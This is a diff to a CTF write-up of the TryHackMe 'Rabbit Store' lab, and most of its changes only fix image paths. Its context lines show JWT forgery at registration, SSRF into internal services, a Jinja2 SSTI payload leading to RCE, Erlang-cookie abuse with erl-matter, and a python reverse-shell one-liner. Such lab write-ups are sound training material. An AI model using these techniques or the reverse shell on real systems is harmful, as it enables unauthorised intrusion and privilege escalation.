@@ -70,7 +70,7 @@ nmap -sC -sV -p- -T5 -v -oN /home/kali/Desktop/THM_LAB/rooms/medium/rabbit_store
 - Port 4369 = indicates Erlang infrastructure and helps identify Erlang-distributed services.
 - Port 25672 = investigate RabbitMQ/Erlang architecture and authentication
 
-![nmap](/assets/images/writeups/rabbit_store/rabbit_store_1.png)
+![nmap](/assets/images/writeups/thm/rabbit_store/rabbit_store_1.png)
 
 ➡️ **Decision:** Focus on the web server first.
 
@@ -153,7 +153,7 @@ edits on `/etc/hosts`
 
 After we have logged in with our created account, we see that the services are only available for internal users and our newly created account has to be activated by an administrator.
 
-![account creation](/assets/images/writeups/rabbit_store/rabbit_store.png)
+![account creation](/assets/images/writeups/thm/rabbit_store/rabbit_store.png)
 
 ---
 
@@ -171,16 +171,16 @@ Depending on the application, a `cookie `might contain:
 - Preferences
 - Other application state
 
-![Cookies](/assets/images/writeups/rabbit_store/rabbit_store_3.png)
+![Cookies](/assets/images/writeups/thm/rabbit_store/rabbit_store_3.png)
 
 ### 🛠 Exploit JWT
 
 We inspect the token using [jwt.io](https://www.jwt.io/) and see that the subscription is also defined in it.We go back one step and create another account and inspect the request using `Burp Suite`. 
 We simply add the attribute "subscription": "active" in the hope that this will be taken into account when the token is created and that we have a JWT token forgery vulnerability in front of us.
 
-![JWT](/assets/images/writeups/rabbit_store/rabbit_store_4.png)
+![JWT](/assets/images/writeups/thm/rabbit_store/rabbit_store_4.png)
 
-![JWT](/assets/images/writeups/rabbit_store/rabbit_store_5.png)
+![JWT](/assets/images/writeups/thm/rabbit_store/rabbit_store_5.png)
 
 ```
 POST /api/register HTTP/1.1
@@ -200,7 +200,7 @@ Priority: u=0
 ```
 The response of the server looks promising, it returns that the registration was successful.
 
-![JWT](/assets/images/writeups/rabbit_store/rabbit_store_6.png)
+![JWT](/assets/images/writeups/thm/rabbit_store/rabbit_store_6.png)
 
 If we log back in we are presented with a new site, our URL also changed.
 `http://storage.cloudsite.thm/dashboard/active`
@@ -269,7 +269,7 @@ This can potentially lead to:
 
 Visiting `http://storage.cloudsite.thm/dashboard/active`, we see two methods for uploading files and a list of uploaded files.
 
-![SSRF](/assets/images/writeups/rabbit_store/rabbit_store_7.png)
+![SSRF](/assets/images/writeups/thm/rabbit_store/rabbit_store_7.png)
 
 Inspecting the source code of the dashboard, we notice an interesting script included from `/assets/js/custom_script_active.js`. Reviewing this script at `http://storage.cloudsite.thm/assets/js/custom_script_active.js`, we find that it handles most of the functionality displayed on the page.
 
@@ -277,7 +277,7 @@ OR
 
 we can use `gobuster` to find out the hidden directories also.
 
-![SSRF](/assets/images/writeups/rabbit_store/rabbit_store_8.1.png)
+![SSRF](/assets/images/writeups/thm/rabbit_store/rabbit_store_8.1.png)
 
 From the script, we identify two additional endpoints:
 
@@ -305,7 +305,7 @@ Refreshing the dashboard, we now see a single upload in the list of uploaded fil
 
 Clicking the file redirects us to `/api/uploads/19c4c36d-5458-438d-ae7d-3e6708c09a77`, where we can view the contents of our file.
 
-![SSRF](/assets/images/writeups/rabbit_store/rabbit_store_9.png)
+![SSRF](/assets/images/writeups/thm/rabbit_store/rabbit_store_9.png)
 
 We use a script to find more services on other ports on localhost. To do this, we simply check whether the requested service gives us a download link.
 
@@ -359,7 +359,7 @@ And the port 15672 the management dashboard for the RabbitMQ broker, we touched 
 
 We make a request for `http://127.0.0.1:3000/api/docs` on the `Upload from URL` box.
 
-![SSRF](/assets/images/writeups/rabbit_store/rabbit_store_9.1.png)
+![SSRF](/assets/images/writeups/thm/rabbit_store/rabbit_store_9.1.png)
 
 And on clicking/opening the url `http://storage.cloudsite.thm/api/uploads/1c2bf7f1-8bc2-4fbf-9f6b-bb1420bb1d1a` we recieve the documentation with the endpoint `/api/fetch_messeges_from_chatbot`, which is still under development.
 
@@ -386,11 +386,11 @@ We try to make a request to `/api/fetch_messeges_from_chatbot`, but GET methods 
 
 So we capture our GET request using `Burp Suite` and edit some of its content.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_10.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_10.png)
 
 Testing the newly discovered `/api/fetch_messeges_from_chatbot` endpoint by making a POST request with an empty JSON payload, we receive the message “username parameter is required”.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_11.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_11.png)
 
 ```
 POST /api/fetch_messeges_from_chatbot HTTP/1.1
@@ -406,7 +406,7 @@ Content-Length: 0
 ```
 Next, when we send a request with the `username` parameter using the payload {"username":"test"}, we receive a message indicating that the chatbot is under development.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_11.1.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_11.1.png)
 
 However, an interesting observation is that the `username` we entered is reflected in the response. Due to this, we can test for the `SSTI` vulnerability by using a `polygot SSTI` payload such as: `$ [two-curley opening braces here] <%[%'"}}%\.`, with the payload:
 
@@ -414,9 +414,9 @@ However, an interesting observation is that the `username` we entered is reflect
 
 We use a payload from Ingo Kleiber to test for RCE on Flask (Jinja2) SSTI and are successful.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_11.2.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_11.2.png)
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_11.3.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_11.3.png)
 
 **NOTE**
 `Those [two-curley opening braces here] were written like that because it was causing error on liquid template here on jekyll parsing. so, i have written like that and before using that content replace with the note written inside each [] blocks`
@@ -435,13 +435,13 @@ Now that we know the `username` field is vulnerable to SSTI and the application 
 ```
 Upon sending this payload, the server hangs as expected.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_11.4.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_11.4.png)
 
 And checking our listener, we obtain a `shell as the azrael user` and can read the user flag at `/home/azrael/user.txt.`
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_12.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_12.png)
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_13.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_13.png)
 
 ---
 
@@ -452,13 +452,13 @@ The next thing we checked was the home directory of rabbitmq, the broker system,
 ### ❓ What is RabbitMQ?
 “RabbitMQ is a reliable and mature messaging and streaming broker, which is easy to deploy on cloud environments, on-premises, and on your local machine.”
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_14.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_14.png)
 
 we can see that the `.erlang.cookie` is readable to us, which is a strong indicator that we have RCE as that user and can escalate our privileges.
 
 Now we used [erl-matter](https://github.com/gteissier/erl-matter) repo to get RCE. You can use the cookie and get a shell, but only execute one command to get a decent reverse shell, because the program crashed immediately for me.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_15.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_15.png)
 
 ```
 python2 shell-erldp.py <targert-ip> 25672 HIDDENCOOKIE
@@ -475,7 +475,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ```
 Now we will now get a shell as RabbitMQ.
 
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_16.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_16.png)
 
 ```
 chmod 600 .erlang.cookie 
@@ -530,7 +530,7 @@ we googled a little bit and found this GitHub issue, which shows us how we can c
 ```
 echo '49e6hSldHRaiY <REDACTED> xhSBHtGU+YBzWF' | base64 -d | xxd -pr -c128 | cut -c9-
 ```
-![SSTI](/assets/images/writeups/rabbit_store/rabbit_store_17.png)
+![SSTI](/assets/images/writeups/thm/rabbit_store/rabbit_store_17.png)
 
 ---
 
